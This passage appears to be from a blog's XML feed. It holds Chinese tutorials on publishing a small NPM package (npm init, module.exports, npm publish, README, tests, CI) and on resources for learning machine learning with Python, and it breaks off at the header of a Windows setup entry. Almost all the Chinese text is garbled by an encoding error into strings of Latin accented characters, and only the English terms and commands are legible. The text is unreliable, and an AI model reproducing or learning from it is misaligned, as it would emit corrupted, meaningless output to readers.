åˆ†äº«åˆ° NPMå‡è¨­æˆ‘å€‘ä»Šå¤©æƒ³åˆ†äº«ä¸€å€‹å¥—ä»¶ï¼Œä»¥æˆ‘é–‹ç™¼çš„å°å¥—ä»¶date2objç‚ºä¾‹ï¼Œå‘Šè¨´å¤§å®¶æ€æ¨£åˆ†äº«åˆ° NPM ä¸Šã€‚ç°¡å–®ä»‹ç´¹ä¸€ä¸‹ date2objï¼Œåœ¨å¯« Javascipt çš„æ™‚å€™ï¼ŒDate æ™‚é–“ç‰©ä»¶å¸¸å¸¸è¦åšåˆ†é›¢çš„å‹•ä½œï¼Œé›–ç„¶ç¨‹å¼ç¢¼å¾ˆçŸ­ï¼Œä½†æ¯å€‹å°ˆæ¡ˆéƒ½è¦ copy ä¸€æ¬¡çœŸçš„å¾ˆéº»ç…©ï¼Œæ‰€ä»¥æˆ‘å¼„æˆå¯ä»¥å‘¼å«çš„å¥—ä»¶ã€‚
åˆ†äº«åˆ° NPM çš„æ“ä½œæ­¥é©Ÿå¦‚ä¸‹ï¼š

åœ¨ Github å»ºç«‹ date2obj å°ˆæ¡ˆã€‚
æ¥è‘—ç›´æ¥ git clone ä¸‹ä¾†ã€‚
çµ‚ç«¯æ©Ÿ cd date2obj é€²å…¥è³‡æ–™å¤¾ã€‚
çµ‚ç«¯æ©Ÿè¼¸å…¥ npm init ç”¨ä¾†åˆå§‹åŒ–å°ˆæ¡ˆï¼Œå¦‚æœæœ‰è£å¥½ NodeJS çš„è©±ï¼Œnpm å°±æ˜¯å®‰è£å¥½çš„äº†ã€‚
æ¥ä¸‹ä¾†çµ‚ç«¯æ©Ÿæœƒå‡ºç¾å•é¡Œï¼Œè¦ä½ å¡«å¯«å°ˆæ¡ˆåç¨±ã€ç‰ˆæœ¬è™Ÿã€ä½œè€…ã€é—œéµå­—ç­‰ç­‰è³‡è¨Šã€‚ä»€éº¼éƒ½ä¸è¼¸å…¥ï¼ŒæŒ‰ä¸‹ enter å°±æ˜¯çœç•¥çš„æ„æ€ã€‚å…¶ä¸­ä»–æœƒå•ä¸»ç¨‹å¼å°±ç…§é è¨­çš„ index.js å³å¯ï¼Œè€Œ test å¯ä»¥å…ˆç•¥éï¼Œç‰ˆæœ¬è™Ÿå…¶å¯¦æœ‰å®ƒçš„æ„ç¾©ï¼Œä¸éé€™é‚Šæˆ‘å€‘å¯ä»¥éš¨ä¾¿è¼¸å…¥æˆ–ç…§é è¨­çš„1.0.0ã€‚å®Œæˆä¹‹å¾Œæ‡‰è©²æœƒçœ‹åˆ°ç›®éŒ„åº•ä¸‹å¤šä¸€å€‹ package.json çš„æª”æ¡ˆã€‚
é€™æ™‚å€™ç›®éŒ„è£¡é¢æ‡‰è©²åªæœ‰ä¸€å€‹æª”æ¡ˆï¼špackage.jsonï¼Œæˆ‘å€‘è¦æ‰‹å‹•å»ºç«‹ä¸€å€‹ index.js æª”æ¡ˆã€‚
å‡è¨­æˆ‘å€‘åœ¨ index.js æ‰“å¥½ç¨‹å¼äº†ã€‚é€™é‚Šæˆ‘å€‘ä¾†è§€å¯Ÿ date2obj çš„ index.jsï¼Œæœ€åº•ä¸‹æœ‰ä¸€è¡Œ module.exports = date2obj;ï¼Œé€™æ˜¯é—œéµï¼æˆ‘å€‘å‰›å‰›è¨­å®šä¾ç…§æ­¥é©Ÿå°‡ä¸»ç¨‹å¼è¨­å®šç‚º index.jsï¼Œåœ¨ package.json è£¡é¢å°±æ˜¯ &quot;main&quot;: &quot;index.js&quot;ã€‚

  NPM æœƒæ ¹æ“š main å¾—åˆ°é€™å€‹å°ˆæ¡ˆçš„çš„è¼¸å‡ºåœ°æ–¹æ˜¯ index.jsï¼Œæ‰€ä»¥æˆ‘å€‘åœ¨ index.js çš„æœ€å¾Œä¸€è¡Œèªªæ˜æˆ‘è¦è¼¸å‡ºçš„å‡½å¼æ˜¯ä»€éº¼ï¼Œåœ¨é€™é‚Šæ˜¯ function date2obj()ã€‚8. index.js ä¹Ÿå¯ä»¥å¼•ç”¨åˆ¥äººçš„ NPM å¥—ä»¶ï¼Œç”šè‡³å°ˆæ¡ˆç›®éŒ„è£¡é¢çš„ç¨‹å¼å¯ä»¥éå¸¸è¤‡é›œï¼Œä½†æœ€å¾Œè¦æœ‰ä¸€å€‹è¼¸å‡ºé»ï¼Œè®“ NPM çŸ¥é“ä»¥å¾Œåˆ¥äººè¦ç”¨é€™å€‹å¥—ä»¶è¦å¾å“ªé‚Šé€²å…¥ã€‚9. åˆ°ç›®å‰ç‚ºæ­¢ï¼Œå°ˆæ¡ˆè£¡é¢åªæœ‰å…©å€‹æª”æ¡ˆï¼Œpackage.json å’Œ index.jsã€‚ä½†é€™æ¨£å·²ç¶“æ˜¯åˆæ ¼çš„å¥—ä»¶äº†å–”ï¼é€™å…©å€‹æª”æ¡ˆç¼ºä¸€ä¸å¯ï¼Œpackage.json å¯ä»¥æƒ³åƒæˆè²¨å“çš„æ¨™ç±¤ï¼Œindex.js å‰‡æ˜¯è²¨ç‰©æœ¬èº«ã€‚10. æ¥ä¸‹ä¾†å°±å¯ä»¥åˆ†äº«åˆ° NPM å¹³å°ä¸Šå›‰ï¼çµ‚ç«¯æ©Ÿè¼¸å…¥ npm publish ä¾†ä¸Šå‚³ä½ çš„æ¨¡çµ„ï¼Œç¬¬ä¸€æ¬¡ä½¿ç”¨é€™å€‹æŒ‡ä»¤ä»–æœƒéœ€è¦å»ºç«‹å€‹äººè³‡è¨Šå’Œå¯†ç¢¼ï¼Œç…§è‘—æç¤ºåšå³å¯ã€‚11. ä¹‹å¾Œå‡è¨­ä½ æœ‰æ›´æ–°æ¨¡çµ„ï¼Œpackage.json çš„ç‰ˆæœ¬è™Ÿè¦å¢åŠ ï¼Œä¾‹å¦‚ 0.0.1 è®Š 0.0.2ï¼Œå†è¼¸å…¥ npm publish å°±æœƒæ›´æ–°äº†ï¼
çœ‹åˆ°é€™é‚Šï¼Œä½ å·²ç¶“èƒ½è‡ªå·±å¯«ä¸€å€‹æ¨¡çµ„ï¼Œä¸¦åˆ†äº«åˆ° NPM å’Œä¸–ç•Œçš„äººå…±äº«é–‹æºï¼ä¸éä¸€å€‹å¥½çš„å¥—ä»¶ï¼Œåˆ°é€™é‚Šå»é‚„æ²’å®Œæˆï¼
é‚„ç¼ºä»€éº¼ï¼Ÿå…¶å¯¦ç›®å‰ç‚ºæ­¢å·²ç¶“åˆæ ¼äº†ã€‚ä¸éæˆ‘å€‘å¯ä»¥è®“ä»–æ›´å¥½ã€‚ä»¥è»Ÿé«”å·¥ç¨‹å¸«çš„è§’åº¦ï¼Œæˆ‘æœƒå¸Œæœ›å†å¢åŠ å¹¾é»ï¼š

èªªæ˜æ–‡ä»¶ï¼ˆDocumentï¼‰
å–®å…ƒæ¸¬è©¦ï¼ˆUnit Testï¼‰
æŒçºŒæ•´åˆï¼ˆCIï¼‰

èªªæ˜æ–‡ä»¶å¦‚æœå¥—ä»¶çš„ç›®çš„æ˜¯è‡ªå·±ç”¨ï¼Œé‚£éº¼æ²’æœ‰èªªæ˜æ–‡ä»¶å€’æ˜¯ç„¡æ‰€è¬‚ï¼Œè‡ªå·±èƒ½è¨˜ä½å°±å¥½ã€‚ä½†æ˜¯æˆ‘å€‘éƒ½å·²ç¶“ç™¼ä½ˆåˆ° NPM ä¸Šäº†ï¼Œä»£è¡¨å…¶å¯¦æˆ‘å€‘å¸Œæœ›åˆ¥äººä¹Ÿèƒ½ä½¿ç”¨ï¼Œä½ ä¸èƒ½æœŸæœ›åˆ¥äººç¿»é–‹ä½ çš„åŸå§‹ç¢¼ï¼Œç ”ç©¶åŠå¤©æ‰çŸ¥é“æ€éº¼ä½¿ç”¨å®ƒï¼Œäº‹å¯¦ä¸Šé€šå¸¸æˆ‘çœ‹åˆ°èªªæ˜æ–‡ä»¶è‰±æ¾€é›£æ‡‚ã€ç”šè‡³æ²’æœ‰çš„æ™‚å€™ï¼Œå°±ç›´æ¥æ‰¾ä¸‹ä¸€å€‹å¯è¡Œçš„å¥—ä»¶äº†ã€‚æ‰€ä»¥èªªæ˜æ–‡ä»¶å¯ä»¥èªªæ˜¯è‡³é—œé‡è¦ã€‚
æœ€ç°¡å–®çš„èªªæ˜æ–‡ä»¶å°±æ˜¯åœ¨å°ˆæ¡ˆæ ¹ç›®éŒ„åº•ä¸‹å»ºç«‹ä¸€å€‹ README.md æª”æ¡ˆã€‚README.mdæª”æ¡ˆè¢« NPM å’Œ Github é è¨­ç•¶ä½œå°ˆæ¡ˆé¦–é ï¼Œæ„æ€æ˜¯åˆ¥äººé»é€²å»çœ‹åˆ°çš„ç¬¬ä¸€çœ¼ï¼Œå°±æ˜¯README.mdçš„å…§å®¹ã€‚é€šå¸¸è£¡é¢ç°¡å–®æè¿°é€™å€‹æ¨¡çµ„å¯ä»¥å¹¹å˜›ï¼Ÿè©²å¦‚ä½•ä½¿ç”¨ï¼Ÿæ¯”è¼ƒå¤§å‹çš„æ¨¡çµ„é€šå¸¸æœƒæŠŠèªªæ˜æ–‡ä»¶ç”¨ç¶²ç«™å‘ˆç¾ï¼Œä¸¦åœ¨ README.md ä¸­å¼•å°ä½ å»ç¶²ç«™æŸ¥çœ‹æ–‡ä»¶ã€‚
ä¸è«–è‡ªå·±ç”¨æˆ–çµ¦åˆ¥äººç”¨ï¼Œæœ‰èªªæ˜æ–‡ä»¶éƒ½æ˜¯æ¯”è¼ƒæ–¹ä¾¿çš„ã€‚
å–®å…ƒæ¸¬è©¦ç‚ºä»€éº¼è¦å¯«å–®å…ƒæ¸¬è©¦ï¼ŸGoogle ä¸€ä¸‹æœƒæœ‰å¾ˆå¤šç­”æ¡ˆï¼Œä½†ä»¥æˆ‘ä¾†èªªï¼Œå¤§æ¦‚å¯ä»¥æ­¸ç´å…©é»ï¼š

ç¢ºä¿è‡ªå·±å¯«çš„ç¨‹å¼æ²’æœ‰å•é¡Œ
åˆ¥äººçœ‹äº†æ¯”è¼ƒå¿ƒå®‰

å¯«ç¨‹å¼éå¸¸å®¹æ˜“å‡ºéŒ¯ï¼Œæœ€ä½ç´šçš„éŒ¯èª¤æ‰æœ‰æ©Ÿæœƒåœ¨ç·¨è­¯ã€åŸ·è¡Œçš„æ™‚å€™é¦¬ä¸Šçœ‹å‡ºä¾†ï¼Œé‚£ç¨®è—å¾—éå¸¸æ·±çš„å•é¡Œï¼Œç”šè‡³æœ‰æ™‚å€™æ˜¯è¶…å¤§æ¼æ´ï¼Œå¾€å¾€åœ¨å¯«çš„æ™‚å€™çœ‹ä¸å‡ºä¾†ã€‚å–®å…ƒæ¸¬è©¦æœ‰å¹«è‡ªå·±æª¢æŸ¥çš„å¥½è™•ï¼Œå¯ä»¥ç›¡å¯èƒ½åˆ—å‡ºå¯èƒ½çš„éŒ¯èª¤ï¼Œåœ¨æ¸¬è©¦çš„æ™‚å€™å³æ™‚ç™¼ç¾ï¼Œé—œæ–¼å¦‚ä½•å¯«æ¸¬è©¦æœ¬ç¯‡ä¸å¤šæ•˜è¿°ã€‚
å¦å¤–ä¸€é»å°±æ˜¯ï¼Œç•¶æˆ‘æƒ³ç”¨åˆ¥äººå¥—ä»¶çš„æ™‚å€™ï¼Œæˆ‘æœƒçœ‹ä»–æœ‰æ²’æœ‰å¯«æ¸¬è©¦ï¼Œå¦‚æœæ²’æœ‰çš„è©±ï¼Œå¯¦åœ¨å¾ˆé›£ä»¤äººæ”¾å¿ƒä»–æ²’å•é¡Œï¼Œæ‰€ä»¥ç™¼ä½ˆçš„å¥—ä»¶å¿…å¯«æ¸¬è©¦å¹¾ä¹å·²ç¶“æˆç‚ºä¸æˆæ–‡è¦å®šäº†ï¼
æŒçºŒæ•´åˆé€šå¸¸æ¨¡çµ„çš„å°ˆæ¡ˆé‚„æœƒå†åŠ ä¸ŠæŒçºŒæ•´åˆçš„æœå‹™ï¼Œåƒæ˜¯ Travis æˆ– CircleCI ç­‰ç­‰ã€‚ç°¡å–®èªªæ˜æŒçºŒæ•´åˆçš„æ¦‚å¿µï¼Œæ˜¯æ¯æ¬¡ç¨‹å¼ç¢¼æœ‰è®Šå‹•çš„æ™‚å€™ï¼Œéƒ½è¦èƒ½ç¢ºä¿å®ƒå¯ä»¥ç·¨è­¯ã€åŸ·è¡Œã€é€šéæ¸¬è©¦ï¼Œä»¥å…ä¸‹æ¬¡æ”¹ç¨‹å¼ä¸å°å¿ƒæ•´å€‹æ¨¡çµ„çˆ›æ‰ï¼Œé€™ç¨®æª¢æŸ¥æœ‰å°ˆé–€çš„æœå‹™å•†åœ¨åšï¼Œå¯ä»¥å®Œæ•´æ”¯æ´èˆ‡ Github åŒæ­¥ï¼Œæ¯ç•¶æœ‰æ–°çš„ Pull Request æˆ–æ˜¯æœ‰æ–° commit åˆ°å°ˆæ¡ˆçš„åˆ†æ”¯ï¼ŒæŒçºŒæ•´åˆå°±æœƒåšæª¢æŸ¥ï¼Œå‘Šè¨´ä½ æ–°çš„ç¨‹å¼ç¢¼æœ‰æ²’æœ‰å•é¡Œï¼Œå‡è¨­éƒ½æ²’å•é¡Œï¼Œå°±å¯ä»¥æŠŠæ–°çš„ç¨‹å¼ç¢¼ merge é€² master ä¸»å¹¹ä¸­ã€‚
æœ€å¾Œæœ€å¾Œä½ å¯«äº†ä¸€å€‹å¥½çš„å¥—ä»¶ï¼Œç¸½æ˜¯å¸Œæœ›äººèƒ½ç”¨å§ï¼Ÿä¸ç„¶ä¸å°±ç™½å¯«äº†å—ï¼ï¼
æœ‰æ¥µå°æ©Ÿç‡ï¼Œä½ çš„å¥—ä»¶è«åå…¶å¦™çˆ†ç´…ï¼Œä½†åƒè¬åˆ¥æŒ‡æœ›é€™æ¨£ã€‚æ¯”è¼ƒå‹™å¯¦çš„åšæ³•æ˜¯ï¼Œåšä¸€é»è¡ŒéŠ·æ‰‹æ®µï¼Œåˆ°ç¤¾ç¾¤åˆ†äº«ä½ çš„å¥—ä»¶ï¼Œå¯«éƒ¨è½æ ¼ä»‹ç´¹ä½ å¥—ä»¶çš„åŸç†ï¼Œåœ¨å¤§å‹å°ˆæ¡ˆä¸­è‡ªå‘Šå¥®å‹‡æå‡ºä½¿ç”¨ä½ çš„å¥—ä»¶ç­‰ç­‰ã€‚
å¸Œæœ›å¤§å®¶éƒ½èƒ½å¯«å‡ºå¥½çš„ NodeJS æ¨¡çµ„ï¼


é—œæ–¼ä½œè€…
åŠ‰å®‰é½Š
è»Ÿé«”å·¥ç¨‹å¸«ï¼Œç†±æ„›å¯«ç¨‹å¼ï¼Œæ›´å–œæ­¡æ¨å»£ç¨‹å¼è®“æ›´å¤šäººå­¸æœƒ

å€‹äººç¶²ç«™
Github
FBç²‰å°ˆâ€“å¾®ä¸­å­


]]></content>
      <tags>
        <tag>nodejs</tag>
        <tag>npm</tag>
        <tag>module</tag>
        <tag>tutorial</tag>
      </tags>
  </entry>
  <entry>
    <title>å¦‚ä½•ä½¿ç”¨ Python å­¸ç¿’æ©Ÿå™¨å­¸ç¿’ï¼ˆMachine Learningï¼‰</title>
    <url>/2017/04/08/how-to-mastering-machine-learning-with-python/</url>
    <content><![CDATA[
éš¨è‘—è³‡æ–™ç§‘å­¸ï¼ˆData Scienceï¼‰æŠ€è¡“çš„èˆˆèµ·ï¼Œäººå·¥æ™ºæ…§ï¼ˆArtificial Intelligenceï¼‰ã€æ©Ÿå™¨å­¸ç¿’ï¼ˆMachine Learningï¼‰ æˆç‚ºè¿‘å¹¾å¹´ä¾†é›»è…¦ç§‘å­¸ç•Œååˆ†ç†±é–€çš„ç ”ç©¶é ˜åŸŸï¼Œå¦‚ä»Šåœ¨å¯¦é«”å’Œç·šä¸Šçš„å­¸ç¿’æ©Ÿå™¨å­¸ç¿’çš„è³‡æºæœ‰å¾ˆå¤šï¼Œæœ¬æ–‡æ•´ç†äº†ä¸€äº›å¥½ç”¨å­¸ç¿’è³‡æºå¸Œæœ›å¹«åŠ©åˆå­¸è€…èƒ½æ›´å®¹æ˜“ä½¿ç”¨ Python å…¥é–€æ©Ÿå™¨å­¸ç¿’çš„é ˜åŸŸä¸­ï¼Œå¾é›¶é–‹å§‹å­¸ç¿’æ©Ÿå™¨å­¸ç¿’ã€‚è‹¥æ˜¯å°æ–¼è³‡æ–™ç§‘å­¸ä¸ç†Ÿæ‚‰çš„è®€è€…å¯ä»¥å…ˆåƒè€ƒé©ç”¨æ–¼åˆå­¸è€…çš„è³‡æ–™ç§‘å­¸å½±ç‰‡ ï¼Œè®“è‡ªå·±å°æ–¼è³‡æ–™ç§‘å­¸æœ‰åˆæ­¥çš„èªè­˜ã€‚
ä»€éº¼æ˜¯æ©Ÿå™¨å­¸ç¿’ï¼ˆMachine Learningï¼‰ï¼Ÿæ©Ÿå™¨å­¸ç¿’æ˜¯ä¸€ç¨®è³‡æ–™ç§‘å­¸çš„æŠ€è¡“ï¼Œå”åŠ©é›»è…¦å¾ç¾æœ‰çš„è³‡æ–™å­¸ç¿’ï¼Œä»¥ä¾¿é æ¸¬æœªä¾†çš„è¡Œç‚ºã€çµæœå’Œè¶¨å‹¢ã€‚æ ¹æ“šå­¸ç¿’çš„æ–¹å¼åˆå¯ä»¥åˆ†ç‚ºéœ€è¦è§£ç­”çš„ç›£ç£å¼å­¸ç¿’ï¼ˆSupervised learningï¼‰ã€éç›£ç£å¼å­¸ç¿’ï¼ˆUnsupervised learningï¼‰å’Œå¢å¼·å­¸ç¿’ï¼ˆReinforcement learningï¼‰ï¼ˆé‚„æœ‰ä¸€ç¨®æ··åˆå¼çš„åŠç›£ç£å¼å­¸ç¿’ï¼‰ç­‰å­é¡åˆ¥ã€‚æ©Ÿå™¨å­¸ç¿’æŠ€è¡“å¯ä»¥æ‡‰ç”¨çš„ç¯„åœååˆ†å»£æ³›ï¼Œç¸½çš„ä¾†èªªæ©Ÿå™¨å­¸ç¿’å¯ä»¥è§£æ±ºä»¥ä¸‹å¹¾ç¨®å•é¡Œï¼š

åˆ†é¡å•é¡Œï¼šé€™æ˜¯ A é¡ æˆ– B é¡å—ï¼Ÿ

ç•°å¸¸å€¼åˆ¤æ–·ï¼šé€™å¾ˆå¥‡æ€ªå—ï¼Ÿ

é æ¸¬æ€§åˆ†æï¼šæœ‰å¤šå°‘ï¼Ÿ

åˆ†ç¾¤å•é¡Œï¼šé€™æ˜¯å¦‚ä½•çµ„ç¹”çš„ï¼Ÿ

å¢å¼·å­¸ç¿’å”åŠ©æ±ºç­–ï¼šæˆ‘æ¥ä¸‹ä¾†è©²æ€éº¼è¾¦ï¼Ÿ


ç•¶æˆ‘å€‘è’é›†åˆ°ç›¸é—œã€ç²¾ç¢ºã€é€£è²«ã€è¶³å¤ è³‡æ–™å°±å¯ä»¥æŒ‘é¸åˆé©çš„æ¼”ç®—æ³•é€²è¡Œæ¨¡å‹çš„çš„å»ºç½®ã€‚
ç‚ºä»€éº¼é¸æ“‡ Pythonï¼Ÿåœ¨è³‡æ–™ç§‘å­¸å’Œæ©Ÿå™¨å­¸ç¿’é ˜åŸŸæœ€é‡è¦çš„å…©å¤§ç¨‹å¼èªè¨€å°±æ˜¯ Python å’Œ Rï¼ŒPython ç°¡æ½”æ˜“å­¸ã€æ‡‰ç”¨ç¯„åœå»£ï¼ˆä¸é™æ–¼æ•¸æ“šåˆ†æï¼‰ä¸”å­¸ç¿’æ›²ç·šå¹³ç·©ï¼Œé©åˆä½œç‚ºç¬¬ä¸€å€‹å…¥é–€çš„ç¨‹å¼èªè¨€ï¼Œé€é pandasã€SciPy&#x2F;NumPyã€sckikit-learnã€matplotlib å’Œ statsmodels å¯ä»¥é€²è¡Œæ•¸æ“šåˆ†æçš„å·¥ä½œï¼Œé©åˆå·¥ç¨‹ä»»å‹™å’Œéœ€è¦å’Œç¶²è·¯æ‡‰ç”¨ç¨‹å¼æ•´åˆçš„å°ˆæ¡ˆã€‚è‡³æ–¼ R ç”±æ–¼æ˜¯çµ±è¨ˆå­¸å®¶é–‹ç™¼çš„ç¨‹å¼èªè¨€ï¼Œå‰‡æ˜¯æ“…é•·æ–¼çµ±è¨ˆåˆ†æã€åœ–è¡¨ç¹ªè£½ï¼Œå¸¸ç”¨æ–¼å­¸è¡“ç ”ç©¶é ˜åŸŸï¼Œå»ºè­°ä¹Ÿè¦æœ‰ä¸€å®šç¨‹åº¦çš„æŒæ¡ã€‚ä¸€èˆ¬æƒ…æ³ä¸‹ Python å’Œ R ä¸¦éäº’æ–¥ï¼Œè€Œæ˜¯äº’è£œï¼Œè¨±å¤šè³‡æ–™å·¥ç¨‹å¸«ã€ç§‘å­¸å®¶å¾€å¾€æ˜¯åœ¨ Python å’Œ R å…©å€‹èªè¨€ä¸­è½‰æ›ï¼Œå°é‡æ¨¡å‹é©—è­‰ã€çµ±è¨ˆåˆ†æå’Œåœ–è¡¨ç¹ªè£½ä½¿ç”¨ Rï¼Œç•¶è¦æ’°å¯«æ¼”ç®—æ³•å’Œè³‡æ–™åº«ã€ç¶²è·¯æœå‹™äº’å‹•ç­‰æƒ…æ³æ™‚åœ¨ç§»è½‰åˆ° Pythonã€‚ç‚ºäº†é™ä½å­¸ç¿’æˆæœ¬ï¼Œæˆ‘å€‘å…ˆä½¿ç”¨ Python é€²è¡Œä»‹ç´¹ã€‚
è‹¥å°æ–¼ Python å’Œ R æ¯”è¼ƒï¼Œé€™é‚Šæœ‰å…©ç¯‡æ–‡ç« å¯ä»¥åƒè€ƒ æ•°æ®ç§‘å­¦ç•Œåå±±è®ºå‰‘ï¼šRä¸Pythonå·…å³°å¯¹å†³ã€Which is better for data analysis: R or Python?ã€‚
å¦‚ä½•é–‹å§‹å…¥é–€æ©Ÿå™¨å­¸ç¿’ï¼Ÿäº‹å¯¦ä¸Šï¼Œè³‡æ–™ç§‘å­¸æ˜¯å€‹è·¨é ˜åŸŸå­¸é–€ï¼Œåœ¨å­¸ç¿’å¦‚ä½•ä½¿ç”¨ Python é€²è¡Œæ©Ÿå™¨å­¸ç¿’éç¨‹ä¸­é€šå¸¸å¿…é ˆæŒæ¡ä»¥ä¸‹çŸ¥è­˜ï¼š

æ©Ÿå™¨å­¸ç¿’æ¼”ç®—æ³•
Python ç¨‹å¼èªè¨€å’Œè³‡æ–™åˆ†æå‡½å¼åº«
ç·šæ€§ä»£æ•¸&#x2F;çµ±è¨ˆå­¸ç­‰ç›¸é—œå­¸é–€
å°ˆæ¥­é ˜åŸŸçš„é ˜åŸŸçŸ¥è­˜ï¼ˆDomain Knowledgeï¼‰

ç‚ºäº†æŒæ¡ä»¥ä¸Šä¸‰å¤§é ˜åŸŸçŸ¥è­˜ï¼ˆæˆ‘å€‘å…ˆæŠŠç„¦é»æ”¾åœ¨æ©Ÿå™¨å­¸ç¿’æ ¸å¿ƒæŠ€æ³•ï¼Œæš«æ™‚å¿½ç•¥è³‡æ–™ç§‘å­¸ä¸­å°æ–¼é ˜åŸŸçŸ¥è­˜çš„æŒæ¡ï¼‰ï¼Œå…·é«”ä¾†èªªæˆ‘å€‘å¯ä»¥æœ‰ä»¥ä¸‹æ­¥é©Ÿå¯ä»¥åƒè€ƒï¼š

æŒæ¡åŸºç¤ Python ç¨‹å¼èªè¨€çŸ¥è­˜
 ç·šä¸Šå­¸ç¿’è³‡æºï¼š

Codecademy
DataCamp ï¼ˆä¹Ÿå¯ä»¥å­¸ Rï¼‰
Learn X in Y Minutes (X &#x3D; Python)
Learn Python the Hard Way


äº†è§£åŸºç¤æ•¸å­¸&#x2F;çµ±è¨ˆå­¸å’Œæ©Ÿå™¨å­¸ç¿’åŸºç¤çŸ¥è­˜

å¯æ±—å­¸é™¢ç·šæ€§ä»£æ•¸

Intro to Descriptive Statistics

Intro to Inferential Statistics	

Andrew Ng æ©Ÿå™¨å­¸ç¿’èª²ç¨‹

Andrew Ng æ©Ÿå™¨å­¸ç¿’ç­†è¨˜

Carnegie Mellon University Machine Learning



çŸ¥é“å¦‚ä½•ä½¿ç”¨ Python ç§‘å­¸è¨ˆç®—å‡½å¼åº«å’Œå¥—ä»¶
 æ¨è–¦å®‰è£ Anacondaï¼Œæ”¯æ´è·¨å¹³å°å¤šç¨®ç‰ˆæœ¬ Pythonï¼Œé è¨­å°‡æ•¸æ“šåˆ†æã€ç§‘å­¸è¨ˆç®—çš„å¥—ä»¶è£å¥½ï¼Œè‡ªå¸¶ spyder ç·¨è¼¯å™¨ã€Jupyter Notebookï¼ˆIPython Notebookï¼‰ï¼Œå¯ä»¥æä¾›ä¸€å€‹ç¶²é ç‰ˆä»‹é¢ï¼Œè®“ä½¿ç”¨è€…å¯ä»¥é€éç€è¦½å™¨é€²è¡Œ Juliaã€Python æˆ– R ç¨‹å¼çš„é–‹ç™¼èˆ‡ç¶­è­·ã€‚

numpyï¼šç§‘å­¸åˆ†æï¼ŒScipy Lecture Notes æ•™å­¸æ–‡ä»¶
pandasï¼šè³‡æ–™åˆ†æ
matplotlibï¼šæœƒè£½åœ–çŸ
scikit-learnï¼šæ©Ÿå™¨å­¸ç¿’å·¥å…·


ä½¿ç”¨ scikit-learn å­¸ç¿’ Python æ©Ÿå™¨å­¸ç¿’æ‡‰ç”¨

Machine Learning: Python æ©Ÿå™¨å­¸ç¿’ï¼šä½¿Â­ç”¨PythoÂ­n


é‹ç”¨ Python å¯¦ä½œæ©Ÿå™¨å­¸ç¿’æ¼”ç®—æ³•

æ„ŸçŸ¥å™¨
æ±ºç­–æ¨¹
ç·šæ€§è¿´æ­¸
k-means åˆ†ç¾¤


å¯¦ä½œé€²éšæ©Ÿå™¨å­¸ç¿’æ¼”ç®—æ³•

SVM
KNN
Random Forests
é™ä½ç¶­åº¦
é©—è­‰æ¨¡å‹


äº†è§£æ·±åº¦å­¸ç¿’ï¼ˆDeep Learningï¼‰åœ¨ Python çš„å¯¦ä½œå’Œæ‡‰ç”¨

NTU Applied Deep Learning
Stanford Deep Learning
æ·±åº¦å­¸ç¿’(Deep Learning)è‡ªå­¸ç´ ææ¨è–¦
æ·±åº¦å­¸ç¿’ Deep Learningï¼šä¸­æ–‡å­¸ç¿’è³‡æºæ•´ç†



ç¸½çµä»¥ä¸Šæ•´ç†äº†ä¸€äº›æ©Ÿå™¨å­¸ç¿’ç¶²è·¯å­¸ç¿’è³‡æºï¼Œè‹¥ä½ ç´¯ç©ä¸€äº›å°å°ç¶“é©—å¾Œï¼Œä¸å¦¨æŒ‘æˆ°ä¸€ä¸‹ Kaggle æ¸¬è©¦ä¸€ä¸‹è‡ªå·±çš„å¯¦åŠ›ä¸¦ç´¯ç©æ›´å¤šæ•¸æ“šåˆ†æçš„ç¶“é©—ã€‚
é—œæ–¼ä½œè€…ï¼š@kdchang æ–‡è—å‹é–‹ç™¼è€…ï¼Œå¤¢æƒ³æ˜¯åšå‡ºäººå€‘æƒ³ç”¨çš„ç”¢å“å’Œè¾¦ä¸€æ‰€å¿ƒç›®ä¸­ç†æƒ³çš„å­¸æ ¡ã€‚A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
å»¶ä¼¸é–±è®€
7 Steps to Mastering Machine Learning With Python
äººäººéƒ½å¯æˆç‚ºè³‡æ–™ç§‘å­¸å¤§å¸«ï¼ä¸€æ•´å¹´çš„ç¶²è·¯è‡ªå­¸æ¸…å–®å°±åœ¨é€™äº†
Analytics Vidhya
å°ç£è³‡æ–™ç§‘å­¸å¹´æœƒ
ã€Œ2016 å°ç£è³‡æ–™ç§‘å­¸æ„›å¥½è€…å¹´æœƒã€ç²¾å½©è³‡æ–™ç¸½æ•´ç†(æŒçºŒæ›´æ–°ä¸­)
å¤§æ•¸æ“šæœƒæ¶ˆå¤±ï¼Œè³‡æ–™ç§‘å­¸ä¸æœƒï¼ä½ è©²çŸ¥é“çš„è³‡æ–™ç§‘å­¸ç¬¬ä¸€å ‚èª²
å¦‚ä½•é¸æ“‡ Microsoft Azure Machine Learning çš„æ¼”ç®—æ³•
Microsoft Azure Machine Learning æ©Ÿå™¨å­¸ç¿’æœå‹™æ–‡ä»¶
Kdnuggets
Bigdatafinance
Using Python and R together: 3 main approaches
æœºå™¨å­¦ä¹ æœ€ä½³å…¥é—¨å­¦ä¹ èµ„æº
æœºå™¨å­¦ä¹ (Machine Learning)&amp;æ·±åº¦å­¦ä¹ (Deep Learning)èµ„æ–™(Chapter 1)

ï¼ˆimage via respondrï¼‰
]]></content>
      <tags>
        <tag>Python</tag>
        <tag>Machine Learning</tag>
        <tag>æ©Ÿå™¨å­¸ç¿’</tag>
        <tag>AI</tag>
        <tag>Artificial Intelligence</tag>
        <tag>NLP</tag>
        <tag>Data Mining</tag>
        <tag>äººå·¥æ™ºæ…§</tag>
        <tag>ç›£ç£å¼å­¸ç¿’</tag>
        <tag>Supervised learning</tag>
      </tags>
  </entry>
  <entry>
    <title>å¦‚ä½•åœ¨ Windows æ‰“é€  Python é–‹ç™¼ç’°å¢ƒè¨­å®šåŸºç¤å…¥é–€æ•™å­¸</title>
    <url>/2018/04/14/how-to-setup-python-development-environment-in-windows/</url>
